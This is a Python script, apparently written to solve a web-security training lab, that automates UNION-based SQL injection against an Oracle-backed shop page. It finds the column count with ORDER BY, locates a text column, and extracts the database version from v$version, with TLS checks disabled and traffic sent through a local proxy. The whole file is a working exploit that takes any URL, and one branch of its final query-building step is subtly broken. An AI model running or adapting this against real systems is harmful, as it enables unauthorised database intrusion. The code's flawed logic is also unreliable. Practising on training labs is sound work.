#Lab: SQL injection attack, querying the database type and version on Oracle

import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def main():
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
        exploit(url,payload)
    except IndexError:
        print("[-] Usage %s <url> <payload>"%sys.argv[0])
        sys.exit(0)

def exploit(url,payload):
    url=url+"filter?category=Gifts"+payload
    for i in range(1,10):
        fuzz=url+" order by "+str(i)+" --"
        r=requests.get(fuzz,verify=False,proxies=proxies)
        if(r.status_code!=200):
            print("[+] Found No.of Cols Using Order by : "+str(i-1))
            check_no_cols(url,(i-1),payload)
            sys.exit()
def check_no_cols(url,cols,payload):
    fuzz=url+" union select"+" null,"*(cols-1)+"null from dual --"
    print("[+] checking query :")
    print(fuzz)
    r=requests.get(fuzz,verify=False,proxies=proxies)
    if(r.status_code==200):
        print("[+] Request success ")
        print("[+] Finding String Column ")
        string_col_position=finding_string_col(url,cols)
        if string_col_position:
            print("[+] Found String Column : "+str(string_col_position))
            print("[+] Fetching DB Version ")
            fetch_data(url,string_col_position,cols)
            sys.exit()
        else:
            print("[-] Not able to find string column")
            sys.exit()
    else:
        print("[-] Request Failed")

def finding_string_col(url,cols):
    
    for i in range(1,cols+1):
        string ="'kamehameha'"
        payload_list=["null"]*cols
        payload_list[i-1]=string
        fuzz=url+" union select "+" ,".join(payload_list)+" from dual --"
        
        r=requests.get(fuzz,verify=False,proxies=proxies)
        
        if string.strip("\'") in r.text:
            print("[+] Found string with below query : ")
            print(fuzz)
            return i

def fetch_data(url,string_col_position,col):

    
    payload_list=['null']*(col-1)
    
    
    if(string_col_position >= (col-1)):
        payload_list.append("banner from v$version")
    else:
        payload_list[string_col_position]=""
    fuzz=url+" union select "+" ,".join(payload_list)+"  --"
        
    print("[+] Trying to fecth data with below query ")
   
    print(fuzz)
   
    r=requests.get(fuzz,verify=False,proxies=proxies)
    
    res=r.text
    if 'Oracle Database' in res:
        print("[+] Found Database Version")
        
        soup=BeautifulSoup(res,'html.parser')
        
        version=soup.find(text=re.compile('.*Oracle\sDatabase.*'))
        
        print("[+] Oracle Version is ")
        print(version)
    
if __name__=="__main__":
    main()